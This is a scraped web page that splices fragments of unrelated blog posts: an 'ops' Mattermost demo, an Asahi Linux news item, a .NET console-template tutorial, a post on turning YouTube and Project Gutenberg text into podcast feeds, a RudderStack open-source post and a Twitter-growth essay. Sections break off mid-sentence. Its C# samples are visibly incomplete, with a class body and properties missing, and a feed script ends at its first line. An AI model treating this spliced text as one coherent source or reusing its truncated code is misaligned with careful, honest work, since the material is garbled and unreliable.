config.json to modify the ip address and l/p:</p>

<pre><code>"DataSource": "root:root@tcp(192.168.42.19:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
</code></pre>

<p>Obviously this is just for demo purposes but as a side note - if you
do accidently deploy this to a public ip with default credentials the
bots that scour the internet looking for these things will be able to
connect and write all the SQL their little bot hearts desire, but their
db encryption operations fail, the cryptojacking
fails, and all the C&amp;C stuff fails. It just shows you how interesting
this style of architecture truly is.</p>

<p>Now let's load up mattermost and give it it's own tap and assign it a static ip address:</p>

                <pre><code>➜ ops load mattermost_5.12.0 -c config.json -p 8065 -b -t tap1 --ip-address 192.168.42.20

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Two weeks ago, security researcher and developer Hector Martin (@marcan42 on Twitter), <a href="https://the8-bit.com/asahi-is-a-novel-project-with-the-goal-of-porting-linux-to-m1-macs/">kicked off an ambitious project</a> with the goal of natively bringing Linux to <a href="https://the8-bit.com/which-m1-apple-silicon-macbook-you-should-buy/">Apple Silicon Macs</a>. The operating system-to-be is called Asahi Linux and apparently today, the project experienced its first breakthrough.</p>
<p>Apple released the second beta of macOS Big Sur 11.2 yesterday. It’s an incremental upgrade that does not necessarily bring grandiose novelty to the table. Instead, as it goes, beta versions often do introduce a lot of under-the-hood features. And one of those features was custom kernel support, as noted by Hector himself.</p>
<p>A kernel is one of the most important aspects of an operating system that has absolute control over everything happening inside a computer. It is a cog that is responsible for interactions between hardware and software components.</p>
<p>That said, support for custom kernels might not excite you, per se. But if you’re dedicated to reverse-engineer Apple’s software for Macs, it’s a pretty big deal. Custom kernels are essentially modified stock kernels. You can add your own features to the modified kernel that the manufacturer does not ship in its own, which means you can make a computer do things it wasn’t originally intended to do.</p>
<p>According to Hector, thanks to kernel support in the latest macOS beta, “the OS now finally includes the firmware and bootloaders and tools necessary to replace Big Sur with not-Big-Sur. That was previously not possible.” He also shared a clip of his MacBook Air displaying the Asahi Linux bootloader:</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>It's happening.</p><p>macOS Big Sur 11.2 beta 2 is out with full custom kernel support.</p><p>Expect a fun early bring-up stream tomorrow. Time to get a few hours of sleep. <a href="https://t.co/Ujq159DqWQ" target="_blank">pic.twitter.com/Ujq159DqWQ</a></p></div>— Hector Martin (@marcan42) <a href="https://twitter.com/marcan42/status/1349478954982232064?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 13, 2021</a></blockquote>
</div></figure>
<p>A bootloader, for instance, is an integral part of powering up your machine. It handles the boot order of operating systems on a machine. Each machine has a bootloader that’s specific to it and gaining control over it is an important step towards installing an entirely different operating system.</p>
<p>Despite the new improvements, it might take some time for a native Linux installation on an M1 Mac to realize and be ready for public distribution. Aside from the custom kernel support, the developers on the Asahi Linux project still need to work on developing drivers for the operating system.</p><div><p>See also</p><div id="block-wrap-95278" data-id="95278" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/apple-store-goes-down-ahead-of-todays-mac-event/" title="Apple Store Down"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg" alt="Apple Store Down" srcset="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-293x293.jpg 293w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-432x432.jpg 432w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-529x529.jpg 529w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-724x724.jpg 724w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>Back in November 2020, Apple’s VP of Software Engineering Craig Federighi said <a aria-label="in an interview with Ars Technica (opens in a new tab)" href="https://arstechnica.com/gadgets/2020/11/we-are-giddy-interviewing-apple-about-its-mac-silicon-revolution/" target="_blank" rel="noreferrer noopener">in an interview with Ars Technica</a> that when it comes to Windows running natively on an M1 Mac, “that’s really up to Microsoft. We have the core technologies for them to do that, to run their ARM version of Windows, which in turn of course supports x86 user-mode applications. But that’s a decision Microsoft has to make, to bring to license that technology for users to run on these Macs. But the Macs are certainly very capable of it.”</p>
<p>The newly added support for custom kernels on Big Sur’s 11.2 Beta 2 may also set a precedent for Microsoft to make the ARM version of Windows available to M1 Mac users as an alternate operating system.</p>
<p>As we’ve noted before, Asahi Linux is an independent project that relies on people’s contributions to continue. You can either offer to volunteer your expertise to the project or contribute an amount to the <a aria-label="project's Patreon (opens in a new tab)" href="https://asahilinux.org/support/" target="_blank" rel="noreferrer noopener">project’s Patreon</a> to expedite the development.</p>

<div id="content">
<p>There's type of application that has followed me since I learned to code in the mid-'80s, and that's the console application. For years they looked the same a <code>Main(string[] args)</code> and some naive inconsistent command line parser. That gradually improved with the adoption of various OSS helper libraries. In this post, I'll walk through what today is my alternative starting point to <code>dotnet new console</code>, a way that greatly reduces the boilerplate code needed for logging, parsing, and validation of arguments, letting me focus on the problem to solve and not the plumbing.</p>
<h2 id="templates">Templates</h2>
<p>A convenient way to scaffold a new project is using the template function of .NET SDK CLI, it comes preloaded with several templates like <code>console</code>, <code>classlib</code>, etc., but beyond that, it's possible to create your own templates, which I've for my and your convenience created, so given <a href="https://dotnet.microsoft.com/download/dotnet/5.0">.NET 5 SDK</a> installed, easily yourself can try and take a look at everything discussed in this post.</p>
<h2 id="devlead-console-template">Devlead Console Template</h2>
<p>So let's get started with creating a new console application according to my opinionated recipe, .NET SDK Templates are distributed as NuGet packages and the canonical source for NuGet packages is <a href="https://www.nuget.org/">NuGet.org</a>, where I've published my template as <a href="https://www.nuget.org/packages/Devlead.Console.Template/">Devlead.Console.Template</a>. Templates are installed using the <code>dotnet new</code> command with <code>--install packageId</code> parameter, in this case:</p>
<pre><code>dotnet new --install Devlead.Console.Template
</code></pre>
<h2 id="dotnet-new-devleadconsole">dotnet new devleadconsole</h2>
<p>With the template installed locally, we now have a new <code>devleadconsole</code> template at our disposal, to create our new console applications with according to me, essential dependencies and boilerplate code:</p>
<pre><code>dotnet new devleadconsole -n MyConsoleApp
</code></pre>
<p>The above command will in the current directory result in the below folder structure</p>
<pre><code>MyConsoleApp
    │   MyConsoleApp.csproj
    │   Program.cs
    │
    └───Commands
        │   ConsoleCommand.cs
        │
        ├───Settings
        │       ConsoleSettings.cs
        │
        └───Validation
                ValidateStringAttribute.cs
</code></pre>
<h2 id="myconsoleapp.csproj">MyConsoleApp.csproj</h2>
<p>The created project file will look something like below</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net5.0&lt;/TargetFramework&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;PackageReference Include="Spectre.Console" Version="0.37.0" /&gt;
    &lt;PackageReference Include="Spectre.Cli.Extensions.DependencyInjection" Version="0.3.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging.Console" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.SourceLink.GitHub" Version="1.0.0" PrivateAssets="All"/&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>let's step for step break it down</p>
<h3 id="outputtype">OutputType</h3>
<p><code>OutputType</code> with the value <code>exe</code>, indicates that this will be an executable.</p>
<h3 id="targetframework">TargetFramework</h3>
<p><code>TargetFramework</code> with the value <code>net5.0</code>, means that this will be compiled for/targeting .NET 5.</p>
<h3 id="nullable">Nullable</h3>
<p><code>Nullable</code> with the value <code>enable</code>, enables the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">nullable reference types</a> feature that was introduced with C# 8, making reference types non-nullable by default, basically moving many errors from being caught late at runtime, to be caught early at compile time.</p>
<h3 id="treatwarningsaserrors">TreatWarningsAsErrors</h3>
<p><code>TreatWarningsAsErrors</code> with the value <code>true</code> makes the compiler grumpier, it won't just break the build for compiler errors, but also for compiler warnings, combined with <code>Nullable</code> I personally believe code quality gets better from the start.</p>
<h3 id="packagereferences">PackageReference(s)</h3>
<ul>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a></strong> is a lot of things, a true swiss army for anyone doing console applications, but in this template, it's foremost an extremely opinionated command-line parser.</li>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Cli.Extensions.DependencyInjection">Spectre.Cli.Extensions.DependencyInjection</a></strong> makes it easy for <a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a> to interop with standard <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection/">Microsoft DependencyInjection</a></strong>, same as used by default for dependency injection with i.e. ASP .NET and Azure Functions.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging">Microsoft.Extensions.Logging</a></strong> simplified provides standard logging abstractions and <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging.Console">Microsoft.Extensions.Logging.Console</a></strong> provides an implementation for logging to the console.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.SourceLink.GitHub">Microsoft.SourceLink.GitHub</a></strong> enables automatic tracking between artifact and source control, providing a better debugging and traceability experience.</li>
</ul>
<h2 id="program.cs">Program.cs</h2>
<p>The generated <code>Program.cs</code> uses the new C#9 <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> pattern removing unnecessary ceremony code from the application, but what it does contain:</p>
<ol>
<li>using statements</li>
<li>Creating dependency injection container</li>
<li>Console logger registration</li>
<li>Hooking up dependency injection container with Spectre.Console</li>
<li>Spectre.Console command declaration</li>
<li>Execute the application</li>
</ol>
<blockquote>
<p>Note: <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> means as <code>RunAsync</code> returns a <code>Task&lt;int&gt;</code>, .NET 5 will automatically generate "<code>Program</code>" class and <code>async Task&lt;int&gt; Main(string args)</code> for you, removing the need to write a lot of boilerplate code.</p>

<h2 id="consolecommand.cs">ConsoleCommand.cs</h2>
<p><code>ConsoleCommand.cs</code> contains "just" your business code, <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> handles the heavy lifting of parsing and validating command-line arguments (<em>based on provided settings class, more on that later in the post.</em>), resolving constructor parameters using dependency injection, etc. Letting you focus on the domain and not the boilerplate code, resulting in a very similar experience to i.e. Azure Function or .NET Workers, enabling reuse of both patterns and code. <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> has support for both async and sync commands.</p>
<pre><code>using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using MyConsoleApp.Commands.Setting;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands
{
    public class ConsoleCommand : AsyncCommand&lt;ConsoleSettings&gt;

            Logger.LogInformation("Optional: {Optional}", settings.Optional);
            Logger.LogInformation("CommandOptionFlag: {CommandOptionFlag}", settings.CommandOptionFlag);
            Logger.LogInformation("CommandOptionValue: {CommandOptionValue}", settings.CommandOptionValue);

        }
    }
}
</code></pre>
<h2 id="consolesettings.cs">ConsoleSettings.cs</h2>
<p><code>ConsoleSettings.cs</code> contains the definition of what parameters each command has, if they're are mandatory/optional, positional and how they validated. It also contains metadata used for automatically generating help and error messages.</p>
<pre><code>using System.ComponentModel;
using Devlead.Console.Commands.Validate;
using Spectre.Console.Cli;

namespace Devlead.Console.Commands.Setting
{
    public class ConsoleSettings : CommandSettings
    {
        [CommandArgument(0, "&lt;mandatory&gt;")]
        [Description("Mandatory argument")]

        [CommandArgument(1, "[optional]")]
        [Description("Optional argument")]
        public string? Optional { get; set; }

        public string? CommandOptionValue { get; set; }
    }
}
</code></pre>
<h2 id="validatestringattribute.cs">ValidateStringAttribute.cs</h2>
<p><a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> can validate either by custom attributes on properties (<em>see <code>ConsoleSettings.CommandOptionValue</code> for an example of that</em>) or globally by overriding <code>Validate()</code> method on <code>CommandSettings</code>. The template ships with a sample <code>ValidateStringAttribute</code> that just validates the length of a string, but you can make it as advanced as you want.</p>
<pre><code>using Spectre.Console;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands.Validation
{
    public class ValidateStringAttribute : ParameterValidationAttribute
    {
        public const int MinimumLength = 3;

        public ValidateStringAttribute() : base(errorMessage: null)
        {
        }

        public override ValidationResult Validate(ICommandParameterInfo parameterInfo, object? value)
            =&gt; (value as string) switch {
                { Length: &gt;= MinimumLength }
                    =&gt; ValidationResult.Success(),

                { Length: &lt; MinimumLength }
                    =&gt; ValidationResult.Error($"{parameterInfo?.PropertyName} ({value}) needs to be at least {MinimumLength} characters long."),

                _ =&gt; ValidationResult.Error($"Invalid {parameterInfo?.PropertyName} ({value}) specified.")
            };
    }
}

<h2 id="conclusion">Conclusion</h2>
<p>This is my opinionated happy path for doing .NET Console applications, feel free to let me know if you've got your own recipe for success, but must say I'm really happy how this combination lets me write console applications in the same way as I do my .NET workers, Azure Functions, ASP .NET Core, etc. ensuring consistency, less duplication and good reuse of both patterns and code.

<p>This is a beautiful, astrally-projected depiction of Mihaly Csikszentmihalyi's <em>flow</em> concept. For the unfamiliar, here's how Csikszentmihalyi describes flow, or <em>the optimal experience</em>:</p>
<blockquote>
<p>It is what the sailor holding a tight course feels when the wind whips through her hair, when the boat lunges through the waves like a colt -- sails, hull, wind, and sea humming a harmony that vibrates in the sailor's veins. It is what a painter feels when the colors on the canvas begin to set up a magnetic tension with each other, and a new <em>thing</em>, a living form, takes shape in front of the astonished creator.</p>
</blockquote>
<p>That sounds pretty good, right? Csikszentmihalyi contends that flow is how we humans can achieve happiness. And it's not something that's given; it's something we have to cultivate and grow and work towards. I cannot recommend his book enough.</p>
<p>Even better was SOUL's depiction of the non-flow state - the lost souls:</p>

<p>Definitely been there. Usually its whenever I hear, "Can you see my screen?" These poor creatures wander the astral plane, lost and unhappy and unsure why.</p>
<p>Luckily, the movie tells us it's never too late, and I believe them.</p>
<p>So, how do we achieve flow?</p>
<p>It's the deliberate combination of skill meeting challenge. More from Csikszentmihalyi:</p>
<blockquote>
<p>The best moments usually occur when a person's body or mind is stretched to its limits in a voluntary effort accomplish something difficult and worthwhile.</p>
</blockquote>
<p>This post documents a legitimate flow experience I had last week that began with an observation about my podcast addiction.</p>
<h2>All My Best Friends are Podcasts</h2>
<p>Yes, that's a <a href="https://www.youtube.com/watch?v=Z_63ZZRLylE">Less Than Jake</a> reference. You're welcome, 8th-Grade Charlie.</p>
<p>And, if you're at all like 28th-Grade Charlie, then you're also helplessly addicted to podcasts.</p>
<p>I listen all the time -- while I'm washing dishes, folding laundry, performing my daily Amazon cardboard box cutting ritual, even taking showers. Carly doesn't understand it, and I certainly can't explain it.</p>
<p>Am I that afraid of silence? My own thoughts? Am I so lonely for friendship that I even found this evisceration quietly comforting?</p>
<blockquote><p lang="en" dir="ltr">Podcasts saying literally nothing for 20 minutes. <a href="https://t.co/nmfka1Gjsp">pic.twitter.com/nmfka1Gjsp</a></p>— Jonathan Ogden (@jogdenUK) <a href="https://twitter.com/jogdenUK/status/1346442437376552962?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote> 
<p>I know too much about ancient Rome to be able to answer these questions.</p>
<p>So, if I'm just going to accept my Overcast overlords, can I turn the tides on this one-directional relationship?</p>
<p>Yes. We can. Enter: the spark of an idea.</p>
<h2>Create a podcast from the audio of YouTube videos</h2>
<p>If I can't control what my favorite podcast hosts are talking about in any given episode, can I instead choose <em>exactly</em> what I want to listen to? What if there were a virtually unlimited source of content to consume? Surely, I could then be more deliberate in my listening habits.</p>
<p>YouTube is our answer. I've been collecting computer science talks and lectures in playlists that I always mean to "watch later" and never do. Fact is, I don't want to watch a YouTube video. I rarely ever sit down and "watch YouTube" (other than The 8-Bit Guy cleaning old VIC-20s). It's not part of my routine. I'm usually moving around too much.</p>
<p>YouTube also makes it really hard to consume something "on the go." You need to pay for their PiP or minimized mode, I think.</p>
<p>Then I found this <a href="https://benjamincongdon.me/blog/2020/03/02/Creating-a-Podcast-Feed-from-a-YouTube-Playlist/">post by Benjamin Congdon</a>: a simple way to create an audio podcast feed from a YouTube playlist using a <a href="https://amzn.to/3qksZiq">Raspberry Pi</a> home server. His tutorial leverages an open source project called <a href="https://github.com/mxpv/podsync/">PodSync</a>, which itself leverages <code>ffmpeg</code> and, everyone's favorite controversy, <code>youtube-dl</code>, behind the scenes to download audio from YouTube and generate a podcast RSS feed. This, this, is exactly what I was looking for!</p>
<p>Nothing to add here, other than bravo, Benjamin. I was able to follow his tutorial pretty much straight through.</p>
<p>Wait, I do have something to add. Benjamin suggests using <code>rsync</code> to upload your mp3s and xml RSS feed to s3 or the like. I did this initially, but I didn't like the idea of having to mark these files as <code>public</code> on s3 in case of some huge accidental traffic surge.</p>
<p>So I came up with another idea:</p>
<ul>
<li>Create a public repo on GitHub and enable GitHub Pages (mine is <a href="https://github.com/rockswhat/listener">here</a>)</li>
<li>Init the repo in your <code>/data</code> directory on the Raspberry Pi (this is the directory with the generated <code>.xml</code> RSS feed and <code>mp3</code> audio files)</li>
<li>Change your Podsync config's hostname to your GitHub Pages site: </li>
</ul>
<div data-language="text"><pre><code>hostname = "https://rockswhat.github.io/listener"`</code></pre></div>
<ul>
<li>Change your cron command to push to your repo (instead of <code>rsync</code> to s3):</li>
</ul>
<div data-language="text"><pre><code>*/15 * * * * cd /home/pi/podsync/data &amp;&amp; git add . &amp;&amp; git commit -m "update feed" &amp;&amp; git push origin main</code></pre></div>
<p>Voila! My own podcast feed of YouTube videos, publicly available on the Internet. You can add my feed to Overcast (or your favorite podcast player) with its XML URL:</p>
<div data-language="text"><pre><code>https://rockswhat.github.io/listener/listen_laterz.xml</code></pre></div>
<h3>C'mon, you really achieved flow from <em>that</em>?</h3>
<p>No, not really, but <em>almost</em>. Tutorials, good ones, at least, are guided paths toward some goal, with micro-feedback and mini-frustrations along the way. And these things are well-suited to flow. They can lead you to flow.</p>
<p>In my case, this tutorial got my gears turning. Which now gets us into to the <code>creative computing</code> side of this article.</p>
<p>I think it's important to remind ourselves to have fun with our computers. To use them to make art, make music, create weird stuff, just because we can. There's so much on our computers and phones now thanks to the Internet that can warp our minds and render us into Lost Souls. We often forget the simple joys of computers of the past, back when they were bicycles for the mind, and used adorable floppy disks or CD-ROM drives for games and encyclopedias. I know there's so much "more" that we can do with computers, but we need to remember that they are here to work for us, and not the other way around.</p>
<p>As soon as I saw Overcast fill up with audio from my <code>Listen Laterz</code> YouTube playlist, I knew I needed to keep going, to see what else I could render from clay into podcast feeds.</p>
<h2>Creating a podcast audiobook from Project Gutenberg e-books</h2>
<p>Where else can we find a giant repository of open content on the Internet that also happens to be inconvenient to consume?</p>
<p>Hello, <a href="https://www.gutenberg.org/">Project Gutenberg</a>! </p>
<p>Project Gutenberg is just about the coolest --- and one of the most important -- things on the internet. The fact that it was <a href="https://en.wikipedia.org/wiki/Project_Gutenberg">started on the ARPANET in 1971</a> blows my mind. That is some creative, forward-thinking from its founder Michael S. Hart.</p>
<p>My idea here is simple: pick a public domain book, chop it up into chapters, convert the chapters to audio, and then generate an xml RSS feed.</p>
<p>I picked Mary Shelley's <a href="https://www.gutenberg.org/files/84/84-h/84-h.htm">Frankenstein</a>, because, why not? I already read it a few years ago during my October "Spooky Reads" habit, but I figured it's the perfect candidate for re-animation.</p>
<p>If you've clicked the link to the text on Project Gutenberg, you'll see it's a plaintext nightmare. I'm not ashamed to admit here that I manually just chopped it up into separate text files, rather than writing a script to somehow do this for me. Whatever, ok?</p>
<p>First let's make some files.</p>
<div data-language="bash"><pre><code><span>cd</span> pieces
<span>touch</span> intro.txt
<span>touch</span> letter-<span>{</span><span>1</span><span>..</span><span>4</span><span>}</span>.txt
<span>touch</span> chapter-<span>{</span><span>1</span><span>..</span><span>24</span><span>}</span>.txt
<span>touch</span> license.txt</code></pre></div>
<p>And then we copy-pasta.</p>
<p>Now that I've got my chapters (aka future podcast episodes) all set, we're ready to convert them to audio. What's the easiest way I can do that?</p>
<p>My "in-the-zone" brain suggests using the terminal's <code>say</code> command. I've used this command a few years ago in one of my earliest creative computing projects: a <a href="https://www.charlieharrington.com/terminal-man-live-in-nyc">live musical performance from a telepresence robot</a>).</p>
<p>Surely, I can write a neat little script to loop through my text files and <code>say</code> them into an <code>mp3</code>. Some Googling for <a href="https://stackoverflow.com/questions/16501663/macs-say-command-to-mp3">advice</a>, and I've soon got this Bash script going:</p>
<div data-language="bash"><pre><code><span>for</span> <span>i</span> <span>in</span> *.txt<span>;</span>
<span>do</span>
    <span>echo</span> <span>"processing <span>$i</span>..."</span><span>;</span>
    <span>name</span><span>=</span><span><span>$(</span><span>echo</span> <span>"<span>$i</span>"</span> <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'.'</span><span>)</span></span>
    say -v Vicki -f <span>$i</span> -o aiff/<span>$name</span>.aiff
    lame -m m aiff/<span>$name</span>.aiff mp3/<span>$name</span>.mp3
    <span>rm</span> aiff/<span>$name</span>.aiff
<span>done</span></code></pre></div>
<p>And it works! Checkpoint reached! The <code>mp3</code> files are now sitting happily in their respective <code>/mp3</code> folder. I experience a fleeting moment of joy, and then immediately plunge into the next challenge: generating an XML feed.</p>
<p>My hack-y brain suggests another copy-pasta. Let's take the feed generated by the Podsync library in the section above, replace pieces of it with Bash variables, and then loop through my text files to jam in the values I want.</p>
<p>More googling ensures, including learning a bit more about <a href="https://en.wikipedia.org/wiki/Here_document#:~:text=In%20computing%2C%20a%20here%20document,it%20were%20a%20separate%20file.">heredocs</a>, and I've eventually got this script:</p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure><div></div></figure><section><div itemprop="articleBody"><h2>It’s all About Open Source</h2>
<p>Open source is a component of almost all software development that takes place today. If you look back, the influence has been potent. For example, the main reason Python became the language most-suited for machine learning is the open-source contributors. In fact, because of the enormous size of the open-source community that is tirelessly developing Python, <a href="https://www.wired.com/2015/11/google-open-sources-its-artificial-intelligence-engine/">Google open-sourced TensorFlow</a>. </p>
<p>Joe Worrall, Director of Open Source and Developer Advocacy at New Relic, <a href="https://blog.newrelic.com/product-news/contributor-centric-systems/">describes</a> the dynamics behind the power of building contributor-centric systems: </p>
<p><em>“Contributors don’t give to the cause. They are a part of it.”</em></p>
<p>RudderStack is an open-source customer data pipeline tool for developers. Being open source is a tag we wear with pride, so much so that we recently partnered with GitHub for <a href="https://github.com/sponsors">GitHub Sponsors for Companies</a>. We value the developer community that works hard to build and support open source projects. In a recent <a href="https://rudderstack.com/blog/RudderStack-gitHub-sponsors-making-open-source-more-sustainable-for-developers">blog</a>, we explained why RudderStack directly compensates developers for their contributions to our project. This post discusses why and how we open-sourced our content and took the next step in our open source journey.</p>
<h2>Why we Open Sourced our Blog and Docs</h2>
<p>Said simply, bringing more voices to the table increases our content’s quality and value, both in thought leadership and our technical documentation. </p>
<p>We want developers to share their ideas, thoughts, and findings while working with RudderStack, customer data, and data in general. We want to learn about the data stacks you are building, problems you are solving, and solutions you are creating. Blogs, tutorials, and even case studies are great ways to share that knowledge.  In short, we want you to contribute!</p>
<h2>Our Previous Blog Infrastructure</h2>
<p>We used <a href="https://wordpress.org/">WordPress</a> for our blog before we decided to open source it. WordPress itself is open source and is fantastic for its simplicity, SEO settings, advertising, and flexible themes. In fact, WordPress is the <em>numero uno</em> choice of bloggers for hosting their own websites as per <a href="https://www.techradar.com/in/best/cms">Tech Radar</a>. </p>
<p>From a site performance and version-control standpoint, though, it’s less straightforward than more modern tooling. Also, to allow contribution, you have to use some sort of plugin (like <a href="https://wordpress.org/plugins/user-submitted-posts/">User Submitted Posts</a>), a less-than-ideal experience for developers, and opens up your dashboard to outside users. </p>
<p>All-in-all, building an open-source, version-controlled blog that enables developers to create content and submit it via pull requests easily is a cumbersome and tricky process on WordPress.</p>
<h2>Open Source Frameworks Options for our Blog</h2>
<p>When we decided to open-source our blog and docs, we were spoilt for choices. Today there are multiple well-supported and fully-featured frameworks for open-source content creation. Some of the options that we considered were  <a href="https://ghost.org/features/">Ghost</a>, <a href="https://jekyllrb.com/">Jekyll</a>, <a href="https://gohugo.io/">Hugo</a>, <a href="https://nanoc.ws/">Nanoc</a>, and <a href="https://www.gatsbyjs.com/">Gatsby</a>. There are even more frameworks beyond these,  and each tool has its pros and cons. Which one do we recommend? Well, we don’t. The best tool for you is the one that fulfills your requirements.</p>
<h2>Why we Picked Gatsby</h2>
<p>We picked <a href="https://www.gatsbyjs.com/docs">Gatsby.js</a> as the framework for open-sourcing our content. While making the decision, Jekyll was a strong contender, but the final choice for us was Gatsby. </p>
<p>Here’s why we chose it:</p>
<ul>
<li>Writing content in Gatsby is simple and developer-friendly. It uses Markdown for formatting. It just takes two plugins to set it up (<code>gatsby-source-filesystem</code> and <code>gatsby-transformer-remark</code>). </li>
<li>Integration with GitHub Pages is simple, which was a priority for us.</li>
<li>Gatsby has a rich library of plugins, which you can use for extending and introducing additional functionalities (in fact, through GitHub Sponsors, we had a <a href="https://www.gatsbyjs.com/plugins/gatsby-plugin-rudderstack/">RudderStack plugin</a> made!)</li>
<li>Implementing Gatsby is relatively straightforward in most cases. You can check their <a href="https://www.gatsbyjs.com/docs/quick-start/">docs</a> to see how to get started with Gatsby.js.</li>
<li>Gatsby is super high performance, meaning speedy page load times.</li>
<li>Gatsby allows creating an interactive experience for the readers.</li>
<li>A vast modern web development community contributes to it.</li>
</ul>
<h2>Wait, What About the Docs?</h2>
<p>Our docs still run on Gitbook but are now open-sourced so that others can contribute. We are currently exploring other open-source frameworks like Slate that will give us more flexibility and better telemetry. We will write another post when we make a decision and complete the migration. </p>
<h2>We are Open Source now!</h2>
<p>So, the RudderStack Blog and Docs are now open source. We’re excited about contributions from the RudderStack community and beyond. </p>
<p>In fact, developers have already started contributing to our documentation. Recently, <a href="https://github.com/benedikt">Benedikt</a> from the <a href="https://userlist.com/">Userlist</a> team created the <a href="https://docs.rudderstack.com/destinations/userlist">docs for the Userlist destination</a> for RudderStack (see the pull request <a href="https://github.com/rudderlabs/rudderstack-docs/pull/12">here</a>). They also built the Userlist integration, submitted a pull request, and it is now live on our platform!  This is the beauty of open source!</p>
<h2>How to Contribute</h2>
<p>Contributing to RudderStack is simple!</p>
<ul>
<li>Visit <a href="https://github.com/rudderlabs/rudder-blog/tree/main/content/blog">RudderStack Blog</a> to contribute to blogs or <a href="https://github.com/rudderlabs/rudderstack-docs">RudderStack Docs</a> for docs..</li>
<li>If you wish to add a new blog/doc, click on <strong>Create new file</strong> or <strong>Upload files</strong> as shown in the following diagram.</li>
<li>Also, to suggest changes to an existing file, go to the file and select Edit this file.</li>

		<p><span><span>Reading Time: </span> <span>7</span> <span>minutes</span></span></p>







<p>Today, I want to talk about how I leverage Twitter to build an audience, build relationships, and find opportunities. I’ll talk about my overall strategy and the little day-to-day things I do, and which tools I use.</p>



<p>I started using Twitter regularly to engage with other founders and talk about my work in October 2019, just shortly after Danielle and I sold our SaaS FeedbackPanda. I had around 400 followers at that point, painfully accumulated over almost ten years. I never tweeted much back then. I may have liked a Tweet here or there, but I wasn’t a very active user. Just a year before that, in November 2018, I had a net negative ten followers.</p>



<p>Once I had decided to give Twitter a real shot, everything changed. Today, I am north of 11.000 followers. Back in June 2020, just before I released my book, I had 4000 followers.</p>



<p>The sale of our business and the journey leading up there had given me a very interesting story to talk about. I see similar things happening on Twitter every day. Someone decides to build a project in public. Another person has a revelation or decisive experience, and they start sharing their story. No matter what the story is, no matter how successful or not the founders are, people are always interested in real and truthful messages.</p>



<p>That’s what I decided to share from the start—real experiences, packaged as short and condensed messages. I wanted to share what I had learned without feeling pushy. I’ve never liked accounts that only tweet fragments of knowledge without engaging in discussions.</p>



<p>That’s why I am following the “Engagement first, then Content, then Sharing” approach. Above all, I want to prioritize interacting with other founders, other entrepreneurs. Then, I want to share my experiences and learnings, and finally, I want to lift and amplify other people’s messages.</p>



<p>Let me share how I approach each of these things.</p>



<h3>Engagement</h3>



<p>I have two rules when it comes to engaging with other Twitter accounts: “engage everyone, no matter the follower count” and “engage to empower, not to debate.”</p>



<p>I will talk to every person who has something interesting to say, whether they joined Twitter in 2009 or yesterday. As long as I sense that someone has the founder community’s interests at heart, I will reply to their Tweets or quote-tweet their content.</p>



<p>What I won’t do is dive into unreasonable debates. There will always be people who thrive on conflict, and they will attempt to focus my attention on themselves. Once I notice that I usually retreat from a conversation.</p>



<p>That doesn’t mean I don’t discuss polarizing topics. I’ll defend my point of view, but I try always to do that from a position of empowerment. I have often deleted a draft reply because it turned an exploration of a topic into a battle of rhetoric. In these cases, I carefully try to reflect on how I can give a reply that shows the person I am talking to that I appreciate their opinion (even when I don’t share it), and, more importantly, how I can show the community that will read the conversation that there is something useful to learn from the exchange. Twitter is a public medium. I consider discussions on Twitter to be akin to a panel discussion at a conference. Respect for the other panelists and awareness of an audience that listens is integral to a good panel. It’s the same for Twitter.</p>



<p>Empowering people also means that I actively seek Tweets and replies that I can retweet for reach. If a founder is looking for help, I amplify their questions. If they are celebrating a win, no matter how small, I share their tweets. I know from my own experience that sometimes, all you need for a big win is for that one person to see your work. That’s what I want to make possible. Making other founders more visible is fun; it doesn’t cost me anything other than a click or two, and it generates a lot of interesting conversations.</p>



<h3>Content</h3>



